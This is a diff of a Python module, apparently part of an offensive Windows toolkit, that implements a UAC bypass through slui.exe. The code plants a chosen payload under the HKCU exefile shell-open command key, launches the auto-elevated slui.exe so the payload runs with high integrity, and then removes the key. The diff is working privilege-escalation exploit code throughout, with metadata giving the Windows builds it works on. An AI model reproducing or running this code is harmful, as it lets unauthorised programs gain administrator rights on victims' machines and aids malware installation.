@@ -1,74 +1,49 @@
-"""
-Works from: Windows 8.1 (9600)
-Fixed in: unfixed
-"""
 import os
 import time
-import ctypes
 import _winreg
 from core.prints import *
+from core.utils import *
 
-class disable_file_system_redirection:
-    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
-    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
-    def __enter__(self):
-        self.old_value = ctypes.c_long()
-        self.success = self.disable(ctypes.byref(self.old_value))
-    def __exit__(self, type, value, traceback):
-        if self.success:
-            self.revert(self.old_value)
+slui_info = {
+        "Description": "Bypass UAC using slui and registry key manipulation",
+		"Id" : "03",
+		"Type" : "UAC bypass",
+		"Fixed In" : "17134",	
+		"Works From" : "9600",
+		"Admin" : False,
+		"Function Name" : "slui",
+		"Function Payload" : True,
+    }
 
 def slui(payload):
-	print """
- -------------------------------------------------------------
- slui.exe is an auto-elevated binary that is vulnerable
- to file handler hijacking. 
- 
- Read access to HKCU\Software\Classes\exefile\shell\open
- is performed upon execution. Due to the registry key 
- being accessible from user mode, an arbitrary executable
- file can be injected.
-
- When everything worked correctly, the payload should be
- spawned with high IL.
- -------------------------------------------------------------
- """
-	print_info("Payload: {}".format(payload))
-	print_info("Attempting to create registry key")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\open\command"))								
-		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
-		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
+		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,os.path.join(payload))
+		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)		
 		_winreg.CloseKey(key)
 	except Exception as error:
-		print_error("Unable to create key")
+		print_error("Unable to create registry keys, exception was raised: {}".format(error))
 		return False
 	else:
-		print_success("Registry keys created")
+		print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))
+		print_success("Successfully created DelegateExecute key")
 
-	print_info("Pausing for 5 seconds before executing")
 	time.sleep(5)
 
-	print_info("Attempting to create process")
-	with disable_file_system_redirection():
-		try:
-			if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs","slui.exe",None,None,1) == 42):
-				print_success("Process started successfully")
-			else:
-				print_error("Problem creating process")
-				return False
-		except Exception as error:
-			print_error("Problem creating process")
-			return False
-	
-	print_info("Pausing for 5 seconds before cleaning")
+	print_info("Disabling file system redirection")
+	with disable_fsr():
+		print_success("Successfully disabled file system redirection")
+		if (process().runas(os.path.join("slui.exe")) == True):
+			print_success("Successfully elevated process ({})".format(os.path.join(payload)))
+		else:
+			print_error("Unable to elevate process ({})".format(os.path.join(payload)))
+			
 	time.sleep(5)
 
-	print_info("Attempting to remove registry key")
 	try:
-		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\open\command"))
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\open\command"))		
 	except Exception as error:
-		print_error("Unable to delete key")
+		print_error("Unable to cleanup")
 		return False
 	else:
-		print_success("Registry keys was deleted")	
+		print_success("Successfully cleaned up, enjoy!")
